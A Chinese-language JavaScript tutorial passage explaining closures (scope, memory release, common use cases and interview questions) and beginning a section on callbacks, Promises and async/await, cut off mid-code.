<p>闭包在JavaScript中的应用非常广泛，它可以用于模块化编程、事件处理、回调函数、异步编程等方面。但要谨慎使用闭包，特别是在处理大量数据时，以避免内存泄漏问题。理解闭包的工作原理和用途对于编写高质量的JavaScript代码非常重要。</p>
<blockquote>
<p>了解闭包前先来了解一下上级作用域和堆栈内存释放问题。</p>
</blockquote>
<h5 id="上级作用域的概念"><a href="#上级作用域的概念" class="headerlink" title="上级作用域的概念"></a>上级作用域的概念</h5><ul>
<li>函数的上级作用域在哪里创建的，上级作用域就是谁</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-number">10</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> a = <span class="hljs-number">20</span><br>    <span class="hljs-title function_">foo</span>()<br>&#125;<br><br><span class="hljs-title function_">sum</span>()<br><span class="hljs-comment">/* 输出</span><br><span class="hljs-comment">    10</span><br><span class="hljs-comment">/</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p><strong>函数 <code>foo()</code> 是在全局下创建的，所以 <code>a</code> 的上级作用域就是 <code>window</code>，输出就是 <code>10</code></strong></p>
</blockquote>
<h5 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> n = <span class="hljs-number">10</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> n =<span class="hljs-number">20</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>       n++;<br>       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(n)<br>     &#125;<br>    <span class="hljs-title function_">f</span>()<br>    <span class="hljs-keyword">return</span> f<br>&#125;<br><br><span class="hljs-keyword">var</span> x = <span class="hljs-title function_">fn</span>()<br><span class="hljs-title function_">x</span>()<br><span class="hljs-title function_">x</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(n)<br><span class="hljs-comment">/* 输出</span><br><span class="hljs-comment">*  21</span><br><span class="hljs-comment">    22</span><br><span class="hljs-comment">    23</span><br><span class="hljs-comment">    10</span><br><span class="hljs-comment">/</span><br></code></pre></td></tr></table></figure>

<p><strong>稍微提个醒，单独的 n++ 和 ++n 表达式的结果是一样的</strong></p>
<blockquote>
<p><strong>思路：<code>fn</code> 的返回值是什么变量 <code>x</code> 就是什么，这里 <code>fn</code> 的返回值是函数名 <code>f</code> 也就是 <code>f</code> 的堆内存地址，<code>x()</code> 也就是执行的是函数 <code>f()</code>，而不是 <code>fn()</code>，输出的结果显而易见</strong></p>
</blockquote>
<h5 id="JS-堆栈内存释放"><a href="#JS-堆栈内存释放" class="headerlink" title="JS 堆栈内存释放"></a>JS 堆栈内存释放</h5><ul>
<li>堆内存：存储引用类型值，对象类型就是键值对，函数就是代码字符串。</li>
<li>堆内存释放：将引用类型的空间地址变量赋值成 <code>null</code>，或没有变量占用堆内存了浏览器就会释放掉这个地址</li>
<li>栈内存：提供代码执行的环境和存储基本类型值。</li>
<li>栈内存释放：一般当函数执行完后函数的私有作用域就会被释放掉。</li>
</ul>
<blockquote>
<p><strong>但栈内存的释放也有特殊情况：① 函数执行完，但是函数的私有作用域内有内容被栈外的变量还在使用的，栈内存就不能释放里面的基本值也就不会被释放。② 全局下的栈内存只有页面被关闭的时候才会被释放</strong></p>
</blockquote>
<h5 id="闭包是什么"><a href="#闭包是什么" class="headerlink" title="闭包是什么"></a>闭包是什么</h5><blockquote>
<p>在 JS 忍者秘籍(P90)中对闭包的定义：闭包允许函数访问并操作函数外部的变量。红宝书上对于闭包的定义：闭包是指有权访问另外一个函数作用域中的变量的函数。 MDN 对闭包的定义为：闭包是指那些能够访问自由变量的函数。这里的自由变量是外部函数作用域中的变量。</p>
</blockquote>
<blockquote>
<p>概述上面的话，<strong>闭包是指有权访问另一个函数作用域中变量的函数</strong></p>
</blockquote>
<h5 id="形成闭包的原因"><a href="#形成闭包的原因" class="headerlink" title="形成闭包的原因"></a>形成闭包的原因</h5><blockquote>
<p><strong>内部的函数存在外部作用域的引用就会导致闭包</strong>。从上面介绍的上级作用域的概念中其实就有闭包的例子 <code>return f</code>就是一个表现形式。</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-number">0</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> b =<span class="hljs-number">14</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">fo</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b)<br>    &#125;<br>    <span class="hljs-title function_">fo</span>()<br>&#125;<br><span class="hljs-title function_">foo</span>()<br></code></pre></td></tr></table></figure>

<blockquote>
<p>这里的子函数 <code>fo</code> 内存就存在外部作用域的引用 <code>a, b</code>，所以这就会产生闭包</p>
</blockquote>
<h5 id="闭包变量存储的位置"><a href="#闭包变量存储的位置" class="headerlink" title="闭包变量存储的位置"></a>闭包变量存储的位置</h5><blockquote>
<p>直接说明：<strong>闭包中的变量存储的位置是堆内存。</strong></p>
</blockquote>
<ul>
<li>假如闭包中的变量存储在栈内存中，那么栈的回收 会把处于栈顶的变量自动回收。所以闭包中的变量如果处于栈中那么变量被销毁后，闭包中的变量就没有了。所以闭包引用的变量是出于堆内存中的。</li>
</ul>
<h5 id="闭包的作用"><a href="#闭包的作用" class="headerlink" title="闭包的作用"></a>闭包的作用</h5><ul>
<li>保护函数的私有变量不受外部的干扰。形成不销毁的栈内存。</li>
<li>保存，把一些函数内的值保存下来。闭包可以实现方法和属性的私有化</li>
</ul>
<h5 id="闭包经典使用场景"><a href="#闭包经典使用场景" class="headerlink" title="闭包经典使用场景"></a>闭包经典使用场景</h5><ul>
<li><ol>
<li><code>return</code> 回一个函数</li>
</ol>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> n = <span class="hljs-number">10</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> n =<span class="hljs-number">20</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>       n++;<br>       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(n)<br>     &#125;<br>    <span class="hljs-keyword">return</span> f<br>&#125;<br><br><span class="hljs-keyword">var</span> x = <span class="hljs-title function_">fn</span>()<br><span class="hljs-title function_">x</span>() <span class="hljs-comment">// 21</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>这里的 return <code>f</code>, <code>f()</code>就是一个闭包，存在上级作用域的引用。</p>
</blockquote>
<ul>
<li><ol>
<li>函数作为参数</li>
</ol>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;林一一&#x27;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;foo&#x27;</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">fo</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a)<br>    &#125;<br>    <span class="hljs-keyword">return</span> fo<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">p</span>)&#123;<br>    <span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;f&#x27;</span><br>    <span class="hljs-title function_">p</span>()<br>&#125;<br><span class="hljs-title function_">f</span>(<span class="hljs-title function_">foo</span>())<br><span class="hljs-comment">/* 输出</span><br><span class="hljs-comment">*   foo</span><br><span class="hljs-comment">/ </span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>使用 return <code>fo</code> 返回回来，<code>fo()</code> 就是闭包，<code>f(foo())</code> 执行的参数就是函数 <code>fo</code>，因为 <code>fo() 中的 a</code> 的上级作用域就是函数<code>foo()</code>，所以输出就是<code>foo</code></p>
</blockquote>
<ul>
<li><ol>
<li>IIFE（自执行函数）</li>
</ol>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> n = <span class="hljs-string">&#x27;林一一&#x27;</span>;<br>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">p</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(n)<br>&#125;)()<br><span class="hljs-comment">/* 输出</span><br><span class="hljs-comment">*   林一一</span><br><span class="hljs-comment">/ </span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>同样也是产生了闭包<code>p()</code>，存在 <code>window</code>下的引用 <code>n</code>。</p>
</blockquote>
<ul>
<li><ol>
<li>循环赋值</li>
</ol>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++)&#123;<br>  (<span class="hljs-keyword">function</span>(<span class="hljs-params">j</span>)&#123;<br>       <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(j)<br>    &#125;, <span class="hljs-number">1000</span>) <br>  &#125;)(i)<br>&#125;<br><span class="hljs-comment">// 输出：0 1 2 3 4 5 6 7 8 9</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>因为存在闭包的原因上面能依次输出1~10，闭包形成了10个互不干扰的私有作用域。将外层的自执行函数去掉后就不存在外部作用域的引用了，输出的结果就是连续的 10。为什么会连续输出10，因为 JS 是单线程的遇到异步的代码不会先执行(会入栈)，等到同步的代码执行完 <code>i++</code> 到 10时，异步代码才开始执行此时的 <code>i=10</code> 输出的都是 10。</p>
</blockquote>
<ul>
<li><ol>
<li>使用回调函数就是在使用闭包</li>
</ol>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;林一一&#x27;</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">timeHandler</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span>);<br>&#125;, <span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure>

<ul>
<li><ol>
<li>节流防抖</li>
</ol>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 节流</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">throttle</span>(<span class="hljs-params">fn, timeout</span>) &#123;<br>    <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">...arg</span>) &#123;<br>        <span class="hljs-keyword">if</span>(timer) <span class="hljs-keyword">return</span><br>        timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>            fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, arg)<br>            timer = <span class="hljs-literal">null</span><br>        &#125;, timeout)<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 防抖</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">fn, timeout</span>)&#123;<br>    <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...arg</span>)&#123;<br>        <span class="hljs-built_in">clearTimeout</span>(timer)<br>        timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>            fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, arg)<br>        &#125;, timeout)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><ol>
<li>柯里化实现</li>
</ol>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">curry</span>(<span class="hljs-params">fn, len = fn.length</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_curry</span>(fn, len)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_curry</span>(<span class="hljs-params">fn, len, ...arg</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">...params</span>) &#123;<br>        <span class="hljs-keyword">let</span> _arg = [...arg, ...params]<br>        <span class="hljs-keyword">if</span> (_arg.<span class="hljs-property">length</span> &gt;= len) &#123;<br>            <span class="hljs-keyword">return</span> fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, _arg)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> _curry.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, fn, len, ..._arg)<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> fn = <span class="hljs-title function_">curry</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">a, b, c, d, e</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a + b + c + d + e)<br>&#125;)<br><br><span class="hljs-title function_">fn</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)  <span class="hljs-comment">// 15</span><br><span class="hljs-title function_">fn</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)<br><span class="hljs-title function_">fn</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)(<span class="hljs-number">3</span>)(<span class="hljs-number">4</span>)(<span class="hljs-number">5</span>)<br><span class="hljs-title function_">fn</span>(<span class="hljs-number">1</span>)(<span class="hljs-number">2</span>)(<span class="hljs-number">3</span>)(<span class="hljs-number">4</span>)(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>

<h5 id="使用闭包需要注意什么"><a href="#使用闭包需要注意什么" class="headerlink" title="使用闭包需要注意什么"></a>使用闭包需要注意什么</h5><blockquote>
<p>容易导致内存泄漏。闭包会携带包含其它的函数作用域，因此会比其他函数占用更多的内存。过度使用闭包会导致内存占用过多，所以要谨慎使用闭包。</p>
</blockquote>
<h5 id="怎么检查内存泄露"><a href="#怎么检查内存泄露" class="headerlink" title="怎么检查内存泄露"></a>怎么检查内存泄露</h5><ul>
<li>performance 面板 和 memory 面板可以找到泄露的现象和位置</li>
</ul>
<p>详细可以查看：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904048961781774#comment">js 内存泄漏场景、如何监控以及分析</a></p>
<h5 id="经典面试题"><a href="#经典面试题" class="headerlink" title="经典面试题"></a>经典面试题</h5><ul>
<li>for 循环和闭包(号称必刷题)</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> data = [];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>  data[i] = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>  &#125;;<br>&#125;<br><br>data[<span class="hljs-number">0</span>]();<br>data[<span class="hljs-number">1</span>]();<br>data[<span class="hljs-number">2</span>]()<br><span class="hljs-comment">/* 输出</span><br><span class="hljs-comment">    3</span><br><span class="hljs-comment">    3</span><br><span class="hljs-comment">    3</span><br><span class="hljs-comment">/</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>这里的 <code>i</code> 是全局下的 <code>i</code>，共用一个作用域，当函数被执行的时候这时的 <code>i=3</code>，导致输出的结构都是3。</p>
</blockquote>
<ul>
<li>使用闭包改善上面的写法达到预期效果，写法1：自执行函数和闭包</li>
</ul>
<blockquote>
<p>此处测试去掉setTimeout后依然输出 0 1 2，不知道为什么加这个</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> data = [];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    (<span class="hljs-keyword">function</span>(<span class="hljs-params">j</span>)&#123;<br>      <span class="hljs-built_in">setTimeout</span>( data[j] = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(j);<br>      &#125;, <span class="hljs-number">0</span>)<br>    &#125;)(i)<br>&#125;<br><br>data[<span class="hljs-number">0</span>]();<br>data[<span class="hljs-number">1</span>]();<br>data[<span class="hljs-number">2</span>]()<br></code></pre></td></tr></table></figure>

<ul>
<li>写法2：使用 <code>let</code></li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> data = [];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>  data[i] = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>  &#125;;<br>&#125;<br><br>data[<span class="hljs-number">0</span>]();<br>data[<span class="hljs-number">1</span>]();<br>data[<span class="hljs-number">2</span>]()<br></code></pre></td></tr></table></figure>

<blockquote>
<p><code>let</code> 具有块级作用域，形成的3个私有作用域都是互不干扰的。</p>
</blockquote>
<h5 id="思考题和上面有何不同-字节"><a href="#思考题和上面有何不同-字节" class="headerlink" title="思考题和上面有何不同 (字节)"></a>思考题和上面有何不同 (字节)</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> result = [];<br><span class="hljs-keyword">var</span> a = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">var</span> total = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">a</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>        result[i] = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            total += i * a;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(total);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_">foo</span>(<span class="hljs-number">1</span>);<br>result[<span class="hljs-number">0</span>]();  <span class="hljs-comment">// 3</span><br>result[<span class="hljs-number">1</span>]();  <span class="hljs-comment">// 6</span><br>result[<span class="hljs-number">2</span>]();  <span class="hljs-comment">// 9</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>tip：这里也形成了闭包。total 被外层引用没有被销毁。</p>
</blockquote>
<h3 id="4、异步编程"><a href="#4、异步编程" class="headerlink" title="4、异步编程"></a>4、异步编程</h3><p>异步编程是一种编程范式，用于处理需要等待或不立即执行的任务，以确保程序在等待时能够继续执行其他任务。在JavaScript和许多其他编程语言中，异步编程是非常重要的，因为它允许程序处理诸如网络请求、文件读写、定时器等耗时的操作，而不会阻塞主线程的执行。</p>
<p>以下是对异步编程的理解和关键概念：</p>
<ol>
<li><p><strong>回调函数：</strong> 异步编程最早的形式是使用回调函数。回调函数是一个函数，它在某个异步操作完成后被调用。回调函数通常作为参数传递给异步函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params">callback</span>) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;Async data&quot;</span>;<br>    <span class="hljs-title function_">callback</span>(data);<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><br><span class="hljs-title function_">fetchData</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">result</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出 &quot;Async data&quot;</span><br>&#125;);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>Promise：</strong> Promise是一种更强大且可读性更好的异步编程方式。它代表一个异步操作的最终完成（或失败），并允许使用<code>.then()</code>方法来注册成功和失败时的回调函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, reject</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;Async data&quot;</span>;<br>      <span class="hljs-title function_">resolve</span>(data); <span class="hljs-comment">// 成功时调用resolve</span><br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;);<br>&#125;<br><br><span class="hljs-title function_">fetchData</span>()<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">result</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出 &quot;Async data&quot;</span><br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);<br>  &#125;);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>async&#x2F;await：</strong> async&#x2F;await 是一种用于编写异步代码的更简洁方式，它建立在Promise之上。使用<code>async</code>关键字定义一个函数，函数内部可以使用<code>await</code>关键字等待一个Promise的完成。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">resolve</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;Async data&quot;</span>;<br>      <span class="hljs-title function_">resolve</span>(data);<br>    &#125;, <span 